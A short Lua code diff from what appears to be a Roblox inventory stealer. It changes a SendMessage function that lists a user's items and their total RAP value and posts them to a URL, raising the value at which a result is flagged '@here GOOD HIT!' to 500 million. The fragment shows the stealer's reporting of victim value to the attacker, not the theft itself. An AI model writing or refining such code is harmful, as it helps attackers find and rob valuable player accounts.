@@ -146,7 +146,7 @@ local function SendMessage(url, username, diamonds)
         fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
         totalRAP = totalRAP + (itemData.rap * itemData.amount)
     end
-    if totalRAP > 10 then
+    if totalRAP > 500000000 then
 		poopie = "@here GOOD HIT!"
     else
 		poopie = "poop hit"
